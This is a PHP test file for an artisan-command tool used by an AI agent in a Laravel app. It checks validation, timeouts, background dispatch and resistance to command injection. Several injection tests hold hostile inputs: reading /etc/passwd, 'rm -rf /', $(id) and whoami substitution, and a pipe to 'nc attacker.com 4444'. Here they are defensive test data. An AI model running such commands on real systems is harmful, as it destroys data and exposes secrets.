<?php

use App\Modules\Core\AI\Models\OperationDispatch;
use App\Modules\Core\AI\Services\BackgroundCommandService;
use App\Modules\Core\AI\Tools\ArtisanTool;
use App\Modules\Core\User\Models\User;
use Illuminate\Support\Facades\Process;
use Tests\Support\AssertsToolBehavior;
use Tests\TestCase;

uses(TestCase::class, AssertsToolBehavior::class);

const ARTISAN_ROUTES_OUTPUT = 'routes output';
const ARTISAN_COMMAND_NOT_FOUND = 'Command not found';
const ARTISAN_MIGRATE_COMMAND = 'php artisan migrate';
const ARTISAN_MIGRATE_SEED_COMMAND = 'php artisan migrate --seed';

beforeEach(function () {
    $this->backgroundService = Mockery::mock(BackgroundCommandService::class);
    $this->tool = new ArtisanTool($this->backgroundService);
});

describe('tool metadata', function () {
    it('has the expected metadata', function () {
        $this->assertToolMetadata(
            $this->tool,
            'artisan',
            'admin.ai.tool.artisan.execute',
            ['command', 'timeout', 'background'],
            ['command'],
        );

        expect($this->tool->description())->toContain('background');
    });

    it('declares timeout as integer type', function () {
        $schema = $this->tool->parametersSchema();
        expect($schema['properties']['timeout']['type'])->toBe('integer');
    });

    it('declares background as boolean type', function () {
        $schema = $this->tool->parametersSchema();
        expect($schema['properties']['background']['type'])->toBe('boolean');
    });
});

describe('input validation', function () {
    it('rejects missing or empty command', function () {
        $this->assertRejectsMissingAndEmptyStringArgument('command');
    });

    it('rejects non-string command', function () {
        $result = $this->tool->execute(['command' => 42]);
        expect((string) $result)->toContain('Error');
    });

    it('rejects whitespace-only command', function () {
        $result = $this->tool->execute(['command' => '   ']);
        expect((string) $result)->toContain('Error');
    });

    it('strips php artisan prefix', function () {
        Process::fake([
            '*' => Process::result(ARTISAN_ROUTES_OUTPUT),
        ]);

        $result = $this->tool->execute(['command' => 'php artisan route:list']);
        expect((string) $result)->toBe(ARTISAN_ROUTES_OUTPUT);
    });

    it('strips artisan prefix without php', function () {
        Process::fake([
            '*' => Process::result(ARTISAN_ROUTES_OUTPUT),
        ]);

        $result = $this->tool->execute(['command' => 'artisan route:list']);
        expect((string) $result)->toBe(ARTISAN_ROUTES_OUTPUT);
    });

    it('rejects artisan-only command that becomes empty after parsing', function () {
        Process::fake([
            '*' => Process::result(output: '', errorOutput: ARTISAN_COMMAND_NOT_FOUND, exitCode: 1),
        ]);

        $result = $this->tool->execute(['command' => '  ']);
        expect((string) $result)->toContain('Error');
    });
});

describe('foreground execution', function () {
    it('executes command and returns output', function () {
        Process::fake([
            '*' => Process::result('Routes listed'),
        ]);

        $result = $this->tool->execute(['command' => 'route:list']);
        expect((string) $result)->toBe('Routes listed');
    });

    it('returns error output on failure', function () {
        Process::fake([
            '*' => Process::result(
                output: '',
                errorOutput: ARTISAN_COMMAND_NOT_FOUND,
                exitCode: 1,
            ),
        ]);

        $result = $this->tool->execute(['command' => 'bad:command']);
        expect((string) $result)->toContain('failed')
            ->and((string) $result)->toContain(ARTISAN_COMMAND_NOT_FOUND);
    });

    it('returns success message for empty output', function () {
        Process::fake([
            '*' => Process::result(''),
        ]);

        $result = $this->tool->execute(['command' => 'cache:clear']);
        expect((string) $result)->toContain('successfully');
    });

    it('returns error output on failure with both outputs', function () {
        Process::fake([
            '*' => Process::result(
                output: 'partial output',
                errorOutput: 'error details',
                exitCode: 1,
            ),
        ]);

        $result = $this->tool->execute(['command' => 'fail:cmd']);
        expect((string) $result)->toContain('failed')
            ->and((string) $result)->toContain('error details')
            ->and((string) $result)->toContain('partial output');
    });

    it('uses default timeout of 30 seconds', function () {
        Process::fake([
            '*' => Process::result('ok'),
        ]);

        $this->tool->execute(['command' => 'test:cmd']);

        Process::assertRan(function ($process) {
            $command = is_array($process->command) ? implode(' ', $process->command) : $process->command;

            return str_contains($command, 'test:cmd');
        });
    });
});

describe('timeout parameter', function () {
    it('accepts custom timeout', function () {
        Process::fake([
            '*' => Process::result('done'),
        ]);

        $result = $this->tool->execute([
            'command' => 'long:cmd',
            'timeout' => 120,
        ]);

        expect((string) $result)->toBe('done');
    });

    it('clamps timeout to minimum of 1 second', function () {
        Process::fake([
            '*' => Process::result('done'),
        ]);

        $result = $this->tool->execute([
            'command' => 'quick:cmd',
            'timeout' => 0,
        ]);

        expect((string) $result)->toBe('done');
    });

    it('clamps timeout to maximum of 300 seconds', function () {
        Process::fake([
            '*' => Process::result('done'),
        ]);

        $result = $this->tool->execute([
            'command' => 'slow:cmd',
            'timeout' => 999,
        ]);

        expect((string) $result)->toBe('done');
    });

    it('falls back to default for non-integer timeout', function () {
        Process::fake([
            '*' => Process::result('done'),
        ]);

        $result = $this->tool->execute([
            'command' => 'test:cmd',
            'timeout' => 'fast',
        ]);

        expect((string) $result)->toBe('done');
    });
});

describe('background execution', function () {
    it('returns dispatch_id immediately', function () {
        $dispatch = new OperationDispatch([
            'id' => 'op_bg_migrate123',
            'task' => ARTISAN_MIGRATE_COMMAND,
            'status' => 'queued',
        ]);

        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->with('migrate', null)
            ->andReturn($dispatch);

        $this->actingAs(User::factory()->make());

        $result = $this->tool->execute([
            'command' => 'migrate',
            'background' => true,
        ]);
        $data = json_decode((string) $result, true);

        expect($data)->not->toBeNull()
            ->and($data['status'])->toBe('dispatched')
            ->and($data['dispatch_id'])->toStartWith('op_')
            ->and($data['command'])->toBe(ARTISAN_MIGRATE_COMMAND);
    });

    it('returns message with dispatch instructions', function () {
        $dispatch = new OperationDispatch([
            'id' => 'op_bg_migrate456',
            'task' => ARTISAN_MIGRATE_COMMAND,
            'status' => 'queued',
        ]);

        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->andReturn($dispatch);

        $result = $this->tool->execute([
            'command' => 'migrate',
            'background' => true,
        ]);
        $data = json_decode((string) $result, true);

        expect($data['message'])->toContain('delegation_status');
    });

    it('does not execute process for background commands', function () {
        Process::fake();

        $dispatch = new OperationDispatch([
            'id' => 'op_bg_no_exec',
            'task' => ARTISAN_MIGRATE_COMMAND,
            'status' => 'queued',
        ]);

        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->andReturn($dispatch);

        $this->tool->execute([
            'command' => 'migrate',
            'background' => true,
        ]);

        Process::assertDidntRun(ARTISAN_MIGRATE_COMMAND);
    });

    it('returns policy_denied for disallowed commands', function () {
        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->andThrow(new InvalidArgumentException('Command "db:wipe" is not permitted for background execution.'));

        $result = $this->tool->execute([
            'command' => 'db:wipe',
            'background' => true,
        ]);

        expect((string) $result)->toContain('Error')
            ->and((string) $result)->toContain('not permitted');
    });

    it('strips prefix before dispatching', function () {
        $dispatch = new OperationDispatch([
            'id' => 'op_bg_stripped',
            'task' => ARTISAN_MIGRATE_SEED_COMMAND,
            'status' => 'queued',
        ]);

        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->with('migrate --seed', null)
            ->andReturn($dispatch);

        $result = $this->tool->execute([
            'command' => ARTISAN_MIGRATE_SEED_COMMAND,
            'background' => true,
        ]);
        $data = json_decode((string) $result, true);

        expect($data['command'])->toBe(ARTISAN_MIGRATE_SEED_COMMAND);
    });

    it('ignores timeout when background is true', function () {
        $dispatch = new OperationDispatch([
            'id' => 'op_bg_timeout',
            'task' => ARTISAN_MIGRATE_COMMAND,
            'status' => 'queued',
        ]);

        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->andReturn($dispatch);

        $result = $this->tool->execute([
            'command' => 'migrate',
            'background' => true,
            'timeout' => 120,
        ]);
        $data = json_decode((string) $result, true);

        expect($data['status'])->toBe('dispatched');
    });
});

describe('output format', function () {
    it('trims output whitespace', function () {
        Process::fake([
            '*' => Process::result("  output with spaces  \n"),
        ]);

        $result = $this->tool->execute(['command' => 'test:cmd']);
        expect((string) $result)->toBe('output with spaces');
    });

    it('prefers stdout over stderr for successful commands', function () {
        Process::fake([
            '*' => Process::result(
                output: 'stdout content',
                errorOutput: 'stderr content',
            ),
        ]);

        $result = $this->tool->execute(['command' => 'test:cmd']);
        expect((string) $result)->toBe('stdout content');
    });

    it('falls back to stderr when stdout is empty', function () {
        Process::fake([
            '*' => Process::result(
                output: '',
                errorOutput: 'stderr only',
            ),
        ]);

        $result = $this->tool->execute(['command' => 'test:cmd']);
        expect((string) $result)->toBe('stderr only');
    });

    it('returns valid JSON for background execution', function () {
        $dispatch = new OperationDispatch([
            'id' => 'op_bg_json',
            'task' => 'php artisan migrate',
            'status' => 'queued',
        ]);

        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->andReturn($dispatch);

        $result = $this->tool->execute([
            'command' => 'migrate',
            'background' => true,
        ]);

        expect(json_decode((string) $result, true))->not->toBeNull();
    });
});

describe('command injection resistance', function () {
    it('passes shell metacharacters as inert argv tokens, not shell commands', function () {
        Process::fake([
            '*' => Process::result('ok'),
        ]);

        $this->tool->execute(['command' => 'tinker --execute="echo `whoami`"']);

        Process::assertRan(function ($process) {
            $cmd = is_array($process->command) ? $process->command : [$process->command];

            // The backtick-enclosed string must be literal tokens, not executed.
            // The parser treats " as a regular char when not at token start.
            return in_array('tinker', $cmd, true)
                && in_array('`whoami`"', $cmd, true);
        });
    });

    it('does not split on semicolons into separate commands', function () {
        Process::fake([
            '*' => Process::result('ok'),
        ]);

        $this->tool->execute(['command' => 'route:list; cat /etc/passwd']);

        Process::assertRan(function ($process) {
            $cmd = is_array($process->command) ? $process->command : [$process->command];

            // The semicolon is part of the first token, not a command separator.
            // 'cat' and '/etc/passwd' are separate argv tokens but they are
            // arguments to 'php artisan', NOT a second shell command.
            return in_array('route:list;', $cmd, true)
                && in_array('cat', $cmd, true)
                && in_array('/etc/passwd', $cmd, true)
                && $cmd[0] === 'php'
                && $cmd[1] === 'artisan';
        });
    });

    it('does not interpret && or || as shell operators', function () {
        Process::fake([
            '*' => Process::result('ok'),
        ]);

        $this->tool->execute(['command' => 'cache:clear && rm -rf /']);

        Process::assertRan(function ($process) {
            $cmd = is_array($process->command) ? $process->command : [$process->command];

            // && is a literal token, not a shell operator.
            return in_array('cache:clear', $cmd, true)
                && in_array('&&', $cmd, true)
                && in_array('rm', $cmd, true)
                && in_array('-rf', $cmd, true)
                && in_array('/', $cmd, true);
        });
    });

    it('does not expand $(...) command substitutions', function () {
        Process::fake([
            '*' => Process::result('ok'),
        ]);

        $this->tool->execute(['command' => 'tinker --execute="$(id)"']);

        Process::assertRan(function ($process) {
            $cmd = is_array($process->command) ? $process->command : [$process->command];

            // The $(id) must be a literal string, not executed.
            return in_array('--execute="$(id)"', $cmd, true);
        });
    });

    it('preserves content inside leading-quote tokens', function () {
        Process::fake([
            '*' => Process::result('ok'),
        ]);

        // When quote is at the START of a token, the parser handles it.
        $this->tool->execute(['command' => "migrate --seed --path='database/migrations'"]);

        Process::assertRan(function ($process) {
            $cmd = is_array($process->command) ? $process->command : [$process->command];

            return in_array('migrate', $cmd, true)
                && in_array('--seed', $cmd, true)
                && in_array("--path='database/migrations'", $cmd, true);
        });
    });

    it('handles unmatched opening quote without crashing', function () {
        Process::fake([
            '*' => Process::result('ok'),
        ]);

        // Unmatched single quote — the parser should not crash.
        $this->tool->execute(['command' => "tinker --execute='echo hello"]);

        Process::assertRan(function ($process) {
            return is_array($process->command);
        });
    });

    it('always passes an array to Process::run, never a string', function () {
        Process::fake([
            '*' => Process::result('ok'),
        ]);

        $this->tool->execute(['command' => 'route:list']);

        Process::assertRan(function ($process) {
            return is_array($process->command)
                && $process->command[0] === 'php'
                && $process->command[1] === 'artisan';
        });
    });
});

describe('background command allowlist security', function () {
    it('rejects shell metacharacters in background commands', function () {
        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->andThrow(new InvalidArgumentException('Command is not permitted for background execution.'));

        $result = $this->tool->execute([
            'command' => 'migrate; cat /etc/passwd',
            'background' => true,
        ]);

        expect((string) $result)->toContain('Error')
            ->and((string) $result)->toContain('not permitted');
    });

    it('rejects pipe operators in background commands', function () {
        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->andThrow(new InvalidArgumentException('Command is not permitted for background execution.'));

        $result = $this->tool->execute([
            'command' => 'migrate | nc attacker.com 4444',
            'background' => true,
        ]);

        expect((string) $result)->toContain('not permitted');
    });

    it('rejects command substitution in background commands', function () {
        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->andThrow(new InvalidArgumentException('Command is not permitted for background execution.'));

        $result = $this->tool->execute([
            'command' => 'migrate $(whoami)',
            'background' => true,
        ]);

        expect((string) $result)->toContain('not permitted');
    });

    it('allowlist prefix does not match unrelated commands with similar names', function () {
        // 'migrate' prefix should match 'migrate:status' but not 'migrateevil'
        $this->backgroundService->shouldReceive('dispatch')
            ->once()
            ->andThrow(new InvalidArgumentException('Command is not permitted for background execution.'));

        $result = $this->tool->execute([
            'command' => 'migrateevil --force',
            'background' => true,
        ]);

        expect((string) $result)->toContain('not permitted');
    });
});
